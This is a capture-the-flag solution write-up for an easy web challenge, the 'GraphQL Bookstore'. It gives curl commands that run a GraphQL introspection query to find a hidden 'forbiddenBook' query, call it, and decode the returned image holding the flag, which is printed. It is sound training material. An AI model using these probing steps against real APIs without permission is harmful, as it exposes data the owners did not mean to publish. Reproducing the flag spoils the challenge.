# Solution — GraphQL Bookstore

**Category:**   Web
**Difficulty:** Easy
**Flag:**       `BHCTF{Socrates_w4s_r1ght_4ll_along}`

## Description
Welcome to the Pwnies Library!


## Handout:
* N/A (only a URL given)


## Setup
`docker compose up --build`


## Quick Solution:
* Notice Graphql is used
* Use Graphql Introspection to view all "API" calls
* Notice there's one suspicious one that is not used on the application itself
* Call it using Graphql - It's an image containing the flag

```bash
# 1. List the queries the schema exposes (introspection)
curl -s http://TARGET:8000/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{ __schema { queryType { fields { name } } } }"}'
# ... reveals an unused query: forbiddenBook

# 2. Call it and decode the returned base64 PNG into a file
curl -s http://TARGET:8000/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{ forbiddenBook }"}' \
  | python3 -c "import sys,json,base64; s=json.load(sys.stdin)['data']['forbiddenBook']; open('flag.png','wb').write(base64.b64decode(s.split(',',1)[1]))"
# 3. Open flag.png and read the flag
```

## Solution, explained:

### 1. Notice the API

Open the site and watch the browser Network tab — every button POSTs to
`/graphql`. That's the signal this is a GraphQL target. Note there is **no
GraphiQL playground**: `GET /graphql` returns 404, so the schema explorer GUI
is not available — you have to query introspection yourself.

### 2. Run an introspection query

GraphQL servers can describe their own schema. Ask which queries exist:

```bash
curl -s http://TARGET:8000/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ __schema { queryType { fields { name description } } } }"}'
```


### 3. Call the hidden query

```bash
curl -s http://TARGET:8000/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ forbiddenBook }"}'
```


The value is a base64-encoded PNG (a `data:` URI). Decode it to an image and
open it — the flag is written on the "forbidden book" cover:

```bash
curl -s http://TARGET:8000/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{ forbiddenBook }"}' \
  | python3 -c "import sys,json,base64; s=json.load(sys.stdin)['data']['forbiddenBook']; open('flag.png','wb').write(base64.b64decode(s.split(',',1)[1]))"
xdg-open flag.png   # or just paste the whole data: URI into a browser address bar
```
